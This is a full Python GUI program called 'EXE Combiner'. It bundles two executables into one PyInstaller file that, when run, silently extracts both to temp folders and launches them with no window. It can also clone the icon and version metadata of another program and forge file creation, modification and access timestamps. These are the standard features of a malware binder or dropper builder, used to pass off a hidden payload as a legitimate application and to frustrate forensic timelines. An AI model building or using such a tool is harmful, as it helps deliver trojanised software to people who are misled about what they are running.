import tkinter as tk
from tkinter import filedialog, messagebox
import os
import shutil
import subprocess
import tempfile
import PyInstaller.__main__
import base64
import threading
import sys
import traceback
import datetime
import time
import hashlib
import pyinstaller_versionfile
import pefile



#Assembly Information data 
assembly_info_data = {
    "ProductName": "",
    "Description": "",
    "CompanyName": "",
    "Copyright": "",
    "Trademarks": "",
    "OriginalFilename": "",
    "ProductVersion": "1.0.0.0",
    "FileVersion": "1.0.0.0",
}


# Parse a date string; returns datetime or None
def parse_datetime(s):
    s = s.strip()
    if not s:
        return None
    formats = [
        "%Y-%m-%d %H:%M:%S",
        "%Y-%m-%d %H:%M",
        "%Y-%m-%d",
    ]
    for fmt in formats:
        try:
            return datetime.datetime.strptime(s, fmt)
        except ValueError:
            continue
    raise ValueError(
        f"Invalid date format: '{s}'.\n"
        f"Use: YYYY-MM-DD HH:MM:SS"
    )


# Set file dates (created/modified/accessed)
def set_file_times(path, created=None, modified=None, accessed=None):
    # atime/mtime are cross-platform via os.utime
    atime = accessed.timestamp() if accessed else None
    mtime = modified.timestamp() if modified else None
    if atime is not None or mtime is not None:
        if atime is None:
            atime = os.path.getatime(path)
        if mtime is None:
            mtime = os.path.getmtime(path)
        os.utime(path, (atime, mtime))

    # Creation time 
    if created is not None and os.name == 'nt':
        try:
            import ctypes
            from ctypes import wintypes

            epoch = datetime.datetime(1601, 1, 1)
            delta = created - epoch
            intervals = int(delta.total_seconds() * 10_000_000)

            filetime = wintypes.FILETIME(
                intervals & 0xFFFFFFFF,
                (intervals >> 32) & 0xFFFFFFFF,
            )

            handle = ctypes.windll.kernel32.CreateFileW(
                str(path),
                0x40000000,  # GENERIC_WRITE
                0,           # no sharing
                None,
                3,           # OPEN_EXISTING
                0x80,        # FILE_ATTRIBUTE_NORMAL
                None,
            )
            if handle == -1:
                raise ctypes.WinError()
            try:
                ok = ctypes.windll.kernel32.SetFileTime(
                    handle, ctypes.byref(filetime), None, None
                )
                if not ok:
                    raise ctypes.WinError()
            finally:
                ctypes.windll.kernel32.CloseHandle(handle)
        except Exception as err:
            print(f"[WARN] Cannot set creation time: {err}")


# Combine Exes 
def combine_exes():
    exe1 = exe1_path.get()
    exe2 = exe2_path.get()
    icon_choice = icon_var.get()
    custom_icon = custom_icon_path.get()

    if not exe1 or not exe2:
        messagebox.showerror("Error", "Please select both EXE files")
        return

    output_dir = filedialog.askdirectory(title="Select Output Directory")
    if not output_dir:
        return

    # Pick icon source
    if icon_choice == 1:
        icon_path = exe1
    elif icon_choice == 2:
        icon_path = exe2
    elif icon_choice == 3 and custom_icon:
        icon_path = custom_icon
    else:
        messagebox.showerror("Error", "Please choose a valid icon")
        return

    # Parse dates only if the checkbox is enabled
    created_dt = modified_dt = accessed_dt = None
    if change_dates_var.get():
        try:
            created_dt = parse_datetime(created_time_var.get())
            modified_dt = parse_datetime(modified_time_var.get())
            accessed_dt = parse_datetime(accessed_time_var.get())
        except ValueError as err:
            messagebox.showerror("Error", str(err))
            return
    else:
        print("[INFO] Change File Dates disabled - dates will not be changed")

    # Open ass. info window or build directly
    if change_assembly_var.get():
        open_assembly_info_window(
            icon_path, output_dir, exe1, exe2,
            created_dt, modified_dt, accessed_dt,
        )
    else:
        threading.Thread(
            target=build_combined_exe,
            args=(icon_path, output_dir, exe1, exe2,
                  False, created_dt, modified_dt, accessed_dt),
            daemon=True,
        ).start()


# Read ver info from EXE 
def read_version_info_from_exe(exe_path):
    if pefile is None:
        return {}
    try:
        pe = pefile.PE(exe_path, fast_load=True)
        pe.parse_data_directories(
            directories=[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_RESOURCE']]
        )
    except Exception as err:
        print(f"[WARN] Cannot read PE: {err}")
        return {}

    result = {}
    mapping = {
        "ProductName":      "ProductName",
        "FileDescription":  "Description",
        "CompanyName":      "CompanyName",
        "LegalCopyright":   "Copyright",
        "LegalTrademarks":  "Trademarks",
        "OriginalFilename": "OriginalFilename",
        "ProductVersion":   "ProductVersion",
        "FileVersion":      "FileVersion",
    }
    try:
        if not hasattr(pe, "FileInfo"):
            return result
        for fileinfo_list in pe.FileInfo:
            for fileinfo in fileinfo_list:
                if fileinfo.Key != b"StringFileInfo":
                    continue
                for string_table in fileinfo.StringTable:
                    for key, value in string_table.entries.items():
                        key_name = key.decode("utf-8", errors="ignore")
                        val = value.decode("utf-8", errors="ignore").strip()
                        if key_name in mapping:
                            result[mapping[key_name]] = val
    except Exception as err:
        print(f"[WARN] Cannot parse FileInfo: {err}")
    finally:
        pe.close()
    return result


# Extract main icon from exe 
def extract_icon_from_exe(exe_path, out_ico_path):
    if pefile is None:
        print("[WARN] pefile is not installed")
        return False
    try:
        pe = pefile.PE(exe_path, fast_load=True)
        pe.parse_data_directories(
            directories=[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_RESOURCE']]
        )
    except Exception as err:
        print(f"[WARN] Cannot open PE: {err}")
        return False

    RT_ICON = 3
    RT_GROUP_ICON = 14
    icons = {}
    groups = {}

    try:
        if not hasattr(pe, "DIRECTORY_ENTRY_RESOURCE"):
            return False
        for entry in pe.DIRECTORY_ENTRY_RESOURCE.entries:
            if entry.id == RT_ICON:
                for res in entry.directory.entries:
                    data = res.directory.entries[0].data.struct
                    icons[res.id] = pe.get_memory_mapped_image()[
                        data.OffsetToData:data.OffsetToData + data.Size
                    ]
            elif entry.id == RT_GROUP_ICON:
                for res in entry.directory.entries:
                    data = res.directory.entries[0].data.struct
                    blob = pe.get_memory_mapped_image()[
                        data.OffsetToData:data.OffsetToData + data.Size
                    ]
                    count = int.from_bytes(blob[4:6], "little")
                    groups[res.id] = (count, blob)
    except Exception as err:
        print(f"[WARN] Read resource error: {err}")
        return False
    finally:
        pe.close()

    if not groups:
        print("[WARN] No icon groups in EXE")
        return False

    # Pick the group with the most image sizes
    best_id = max(groups, key=lambda gid: groups[gid][0])
    group_data = groups[best_id][1]
    id_count = int.from_bytes(group_data[4:6], "little")

    print(f"[DEBUG] Icon groups: {[(g, groups[g][0]) for g in groups]}, using id={best_id}")

    entries = []
    offset = 6
    for _ in range(id_count):
        e = group_data[offset:offset + 14]
        offset += 14
        entries.append({
            "width": e[0], "height": e[1],
            "color_count": e[2], "reserved": e[3],
            "planes": int.from_bytes(e[4:6], "little"),
            "bit_count": int.from_bytes(e[6:8], "little"),
            "bytes_in_res": int.from_bytes(e[8:12], "little"),
            "id": int.from_bytes(e[12:14], "little"),
        })

    blobs = [icons.get(e["id"], b"") for e in entries]

  #Build icon..
    ico_header = b"\x00\x00\x01\x00" + id_count.to_bytes(2, "little")
    dir_entries = b""
    data_offset = 6 + 16 * id_count
    for e, blob in zip(entries, blobs):
        dir_entries += (
            bytes([e["width"] & 0xFF, e["height"] & 0xFF,
                   e["color_count"] & 0xFF, e["reserved"] & 0xFF])
            + e["planes"].to_bytes(2, "little")
            + e["bit_count"].to_bytes(2, "little")
            + len(blob).to_bytes(4, "little")
            + data_offset.to_bytes(4, "little")
        )
        data_offset += len(blob)

    try:
        with open(out_ico_path, "wb") as f:
            f.write(ico_header + dir_entries + b"".join(blobs))
        size = os.path.getsize(out_ico_path)
        with open(out_ico_path, "rb") as f:
            md5 = hashlib.md5(f.read()).hexdigest()
        print(f"[INFO] Icon extracted: {out_ico_path} ({size} bytes, md5={md5})")
        return True
    except Exception as err:
        print(f"[WARN] Cannot write .ico: {err}")
        return False


# Assembly information window
def open_assembly_info_window(icon_path, output_dir, exe1, exe2,
                              created_dt, modified_dt, accessed_dt):
    info_win = tk.Toplevel(root)
    info_win.title("Assembly Information")
    info_win.geometry("560x520")
    info_win.grab_set()

    vars_dict = {}
    fields = [
        ("Product Name:", "ProductName"),
        ("Description:", "Description"),
        ("Company Name:", "CompanyName"),
        ("Copyright:", "Copyright"),
        ("Trademarks:", "Trademarks"),
        ("Original Filename:", "OriginalFilename"),
        ("Product Version:", "ProductVersion"),
        ("File Version:", "FileVersion"),
    ]

    for i, (label_text, key) in enumerate(fields):
        tk.Label(info_win, text=label_text).grid(row=i, column=0, sticky="w", padx=10, pady=5)
        var = tk.StringVar(value=assembly_info_data.get(key, ""))
        tk.Entry(info_win, textvariable=var, width=45).grid(
            row=i, column=1, columnspan=2, padx=10, pady=5, sticky="we"
        )
        vars_dict[key] = var

    status_var = tk.StringVar(value="")

    # Load metadata from the selected EXE
    def load_from(exe_path, label):
        data = read_version_info_from_exe(exe_path)
        if not data:
            messagebox.showwarning(
                "Info",
                f"Cannot read metadata from {label}.\n"
                f"The file may not contain Version Info."
            )
            return
        for key, value in data.items():
            if key in vars_dict and value:
                vars_dict[key].set(value)
        status_var.set(f"Loaded from {label}: {os.path.basename(exe_path)}")

    btn_frame = tk.Frame(info_win)
    btn_frame.grid(row=len(fields), column=0, columnspan=3, pady=(10, 0), sticky="we")

    tk.Button(btn_frame, text="Load from EXE 1",
              command=lambda: load_from(exe1, "EXE 1")).pack(side="left", padx=10)
    tk.Button(btn_frame, text="Load from EXE 2",
              command=lambda: load_from(exe2, "EXE 2")).pack(side="left", padx=10)

    tk.Label(info_win, textvariable=status_var, fg="gray")\
        .grid(row=len(fields) + 1, column=0, columnspan=3, pady=(2, 8))

    # If ok starting build...
    def on_ok():
        for key, var in vars_dict.items():
            assembly_info_data[key] = var.get()
        info_win.destroy()
        threading.Thread(
            target=build_combined_exe,
            args=(icon_path, output_dir, exe1, exe2,
                  True, created_dt, modified_dt, accessed_dt),
            daemon=True,
        ).start()

    def on_cancel():
        info_win.destroy()

    tk.Button(info_win, text="OK", command=on_ok, width=12)\
        .grid(row=len(fields) + 2, column=0, pady=20)
    tk.Button(info_win, text="Cancel", command=on_cancel, width=12)\
        .grid(row=len(fields) + 2, column=1, pady=20)

    info_win.grid_columnconfigure(1, weight=1)


# Build version file for pyinstaller
def create_version_file(filepath):
    version = assembly_info_data.get("FileVersion", "1.0.0.0") or "1.0.0.0"
    if not version and assembly_info_data.get("ProductVersion"):
        version = assembly_info_data["ProductVersion"]

    pyinstaller_versionfile.create_versionfile(
        output_file=filepath,
        version=version,
        company_name=assembly_info_data.get("CompanyName", "") or "",
        file_description=assembly_info_data.get("Description", "") or "",
        internal_name=assembly_info_data.get("ProductName", "") or "combined_exe",
        legal_copyright=assembly_info_data.get("Copyright", "") or "",
        original_filename=assembly_info_data.get("OriginalFilename", "") or "combined_exe.exe",
        product_name=assembly_info_data.get("ProductName", "") or "Combined EXE",
    )
    print(f"[INFO] Version file created: {filepath}")


# Build combined exe 
def build_combined_exe(icon_path, output_dir, exe1, exe2,
                       apply_assembly_info,
                       created_dt, modified_dt, accessed_dt):
    combined_script = os.path.join(output_dir, "combined_exe.py")
    version_file = os.path.join(output_dir, "version_info.txt")
    temp_icon_file = os.path.join(output_dir, "_temp_icon.ico")
    output_exe = os.path.join(output_dir, "combined_exe.exe")

    # Reset caches before build
    if os.path.exists(output_exe):
        try:
            os.remove(output_exe)
            print(f"[INFO] Removed old output: {output_exe}")
        except Exception as err:
            print(f"[WARN] Cannot remove old output: {err}")

    
    cache_dir = os.path.join(os.environ.get("LOCALAPPDATA", ""), "pyinstaller")
    if os.path.isdir(cache_dir):
        try:
            shutil.rmtree(cache_dir, ignore_errors=True)
            print(f"[INFO] PyInstaller cache cleared: {cache_dir}")
        except Exception as err:
            print(f"[WARN] Cannot clear PyInstaller cache: {err}")

   
    for f in (combined_script, version_file, temp_icon_file):
        if os.path.exists(f):
            try:
                os.remove(f)
            except Exception:
                pass

    try:
        # Ver file (optional)
        if apply_assembly_info:
            create_version_file(version_file)
        else:
            print("[INFO] Change Assembly Information disabled")

        # Icon: always extract fresh from the selected EXE
        actual_icon = None
        extracted_icon = False
        if icon_path.lower().endswith(".exe"):
            ok = extract_icon_from_exe(icon_path, temp_icon_file)
            if ok and os.path.exists(temp_icon_file):
                actual_icon = temp_icon_file
                extracted_icon = True
            else:
                print("[WARN] Cannot extract icon, using default")
        else:
            actual_icon = icon_path
        if actual_icon:
            print(f"[DEBUG] actual_icon = {actual_icon}")

        # Read and encode both exes
        with open(exe1, 'rb') as f:
            exe1_data_b64 = base64.b64encode(f.read()).decode('utf-8')
        with open(exe2, 'rb') as f:
            exe2_data_b64 = base64.b64encode(f.read()).decode('utf-8')

        # Template of the combined script
        template = '''import os
import subprocess
import sys
import tempfile
import base64
import shutil
import time

# Track temp dirs to clean up at exit
temp_dirs = []

# Remove all temp dirs created during this run
def cleanup():
    for d in temp_dirs:
        try:
            if os.path.exists(d):
                shutil.rmtree(d, ignore_errors=True)
        except Exception:
            pass

# Decode base64 EXE, write to a temp dir and launch it
def extract_and_run(exe_data_b64, filename):
    temp_dir = tempfile.mkdtemp()
    temp_dirs.append(temp_dir)
    exe_path = os.path.join(temp_dir, filename)
    try:
        exe_data = base64.b64decode(exe_data_b64.encode('utf-8'))
        with open(exe_path, 'wb') as exe_file:
            exe_file.write(exe_data)
        subprocess.Popen(
            [exe_path],
            creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
        )
    except Exception as err:
        print("Error running " + filename + ": " + str(err))

# Entry point
def main():
    # Embedded exe 1
    exe1_data_b64 = """__EXE1__"""
    extract_and_run(exe1_data_b64, "exe1.exe")

    # Embedded exe 2
    exe2_data_b64 = """__EXE2__"""
    extract_and_run(exe2_data_b64, "exe2.exe")

    # Give children time to start before cleaning up
    time.sleep(2)
    cleanup()

if __name__ == "__main__":
    main()
'''

        script_text = template.replace("__EXE1__", exe1_data_b64).replace("__EXE2__", exe2_data_b64)

        # write combined script
        with open(combined_script, "w", encoding='utf-8') as f:
            f.write(script_text)

        # Pyinstaller arguments
        args = [
            combined_script,
            '--onefile',
            '--noconsole',
            '--name=combined_exe',
            '--distpath=' + output_dir,
            '--clean',
            '--noconfirm',
        ]
        if apply_assembly_info and os.path.exists(version_file):
            args.append('--version-file=' + version_file)
        if actual_icon:
            args.append('--icon=' + actual_icon)

        print(f"[INFO] PyInstaller args: {args}")
        PyInstaller.__main__.run(args)

        # Clean up pyinstaller leftovers
        build_dir = os.path.join(os.path.dirname(combined_script), 'build')
        spec_file = os.path.join(os.path.dirname(combined_script), 'combined_exe.spec')

        if os.path.exists(build_dir):
            shutil.rmtree(build_dir, ignore_errors=True)
        if os.path.exists(spec_file):
            os.remove(spec_file)
        if os.path.exists(combined_script):
            os.remove(combined_script)
        if apply_assembly_info and os.path.exists(version_file):
            os.remove(version_file)
        if extracted_icon and os.path.exists(temp_icon_file):
            try:
                os.remove(temp_icon_file)
            except Exception:
                pass

        # Apply dates only if at least one value is provided
        if os.path.exists(output_exe) and (created_dt or modified_dt or accessed_dt):
            try:
                set_file_times(
                    output_exe,
                    created=created_dt,
                    modified=modified_dt,
                    accessed=accessed_dt,
                )
                print(f"[INFO] File dates set: {output_exe}")
            except Exception as err:
                print(f"[WARN] Cannot set file dates: {err}")
        elif os.path.exists(output_exe):
            print("[INFO] Dates unchanged (checkbox off or fields empty)")

        root.after(0, lambda: messagebox.showinfo(
            "Success", "Exes combined successfully!"
        ))

    except Exception as exc:
        err_msg = str(exc)
        traceback.print_exc()
        if os.path.exists(temp_icon_file):
            try:
                os.remove(temp_icon_file)
            except Exception:
                pass
        root.after(0, lambda msg=err_msg: messagebox.showerror(
            "Error", "Build failed: " + msg))


# Browse for exe file
def browse_file(entry_widget):
    file_path = filedialog.askopenfilename(filetypes=[("EXE files", "*.exe")])
    entry_widget.set(file_path)


# Browse for custom icon
def browse_icon():
    file_path = filedialog.askopenfilename(filetypes=[("Icon files", "*.ico")])
    custom_icon_path.set(file_path)


# gui
root = tk.Tk()
root.title("EXE Combiner by Teamfortressfinder")

exe1_path = tk.StringVar()
exe2_path = tk.StringVar()
custom_icon_path = tk.StringVar()
icon_var = tk.IntVar(value=1)

# Checkboxes
change_assembly_var = tk.BooleanVar(value=True)
change_dates_var = tk.BooleanVar(value=False)

# Date fields
created_time_var = tk.StringVar(value="")
modified_time_var = tk.StringVar(value="")
accessed_time_var = tk.StringVar(value="")

# exe 1
tk.Label(root, text="Select EXE 1").grid(row=0, column=0, padx=10, pady=10, sticky="w")
tk.Entry(root, textvariable=exe1_path, width=50).grid(row=0, column=1, padx=10, pady=10)
tk.Button(root, text="Browse", command=lambda: browse_file(exe1_path)).grid(row=0, column=2, padx=10, pady=10)

# Exe 2
tk.Label(root, text="Select EXE 2").grid(row=1, column=0, padx=10, pady=10, sticky="w")
tk.Entry(root, textvariable=exe2_path, width=50).grid(row=1, column=1, padx=10, pady=10)
tk.Button(root, text="Browse", command=lambda: browse_file(exe2_path)).grid(row=1, column=2, padx=10, pady=10)

# Icon
tk.Label(root, text="Select Icon").grid(row=2, column=0, padx=10, pady=10, sticky="nw")
tk.Radiobutton(root, text="Use EXE 1 Icon", variable=icon_var, value=1)\
    .grid(row=2, column=1, sticky="w")
tk.Radiobutton(root, text="Use EXE 2 Icon", variable=icon_var, value=2)\
    .grid(row=3, column=1, sticky="w")
tk.Radiobutton(root, text="Use Custom Icon", variable=icon_var, value=3)\
    .grid(row=4, column=1, sticky="w")

tk.Entry(root, textvariable=custom_icon_path, width=50)\
    .grid(row=5, column=1, padx=10, pady=10)
tk.Button(root, text="Browse Icon", command=browse_icon)\
    .grid(row=5, column=2, padx=10, pady=10)

# Change assembly information checkbox
tk.Checkbutton(
    root,
    text="Change Assembly Information",
    variable=change_assembly_var,
).grid(row=6, column=0, columnspan=3, padx=10, pady=(15, 5), sticky="w")

# Change file dates checkbox
tk.Checkbutton(
    root,
    text="Change File Dates",
    variable=change_dates_var,
).grid(row=7, column=0, columnspan=3, padx=10, pady=(5, 5), sticky="w")

# Date fields; store widget refs to toggle state
date_widgets = []

lbl_created = tk.Label(root, text="Created (YYYY-MM-DD HH:MM:SS):")
lbl_created.grid(row=8, column=0, padx=10, pady=5, sticky="w")
ent_created = tk.Entry(root, textvariable=created_time_var, width=50)
ent_created.grid(row=8, column=1, padx=10, pady=5)
date_widgets.append(lbl_created)
date_widgets.append(ent_created)

lbl_modified = tk.Label(root, text="Modified (YYYY-MM-DD HH:MM:SS):")
lbl_modified.grid(row=9, column=0, padx=10, pady=5, sticky="w")
ent_modified = tk.Entry(root, textvariable=modified_time_var, width=50)
ent_modified.grid(row=9, column=1, padx=10, pady=5)
date_widgets.append(lbl_modified)
date_widgets.append(ent_modified)

lbl_accessed = tk.Label(root, text="Accessed (YYYY-MM-DD HH:MM:SS):")
lbl_accessed.grid(row=10, column=0, padx=10, pady=5, sticky="w")
ent_accessed = tk.Entry(root, textvariable=accessed_time_var, width=50)
ent_accessed.grid(row=10, column=1, padx=10, pady=5)
date_widgets.append(lbl_accessed)
date_widgets.append(ent_accessed)


# Enable/disable date widgets based on the checkbox
def update_date_widgets_state():
    if change_dates_var.get():
        for w in date_widgets:
            if isinstance(w, tk.Entry):
                w.configure(state="normal", disabledforeground="black")
            else:
                w.configure(foreground="black")
    else:
        for w in date_widgets:
            if isinstance(w, tk.Entry):
                w.configure(state="disabled", disabledforeground="gray")
            else:
                w.configure(foreground="gray")


# Bind to checkbox and set initial state
change_dates_var.trace_add("write", lambda *_: update_date_widgets_state())
update_date_widgets_state()

# Combine button
tk.Button(root, text="Combine EXEs", command=combine_exes)\
    .grid(row=11, column=1, padx=10, pady=20)

root.mainloop()
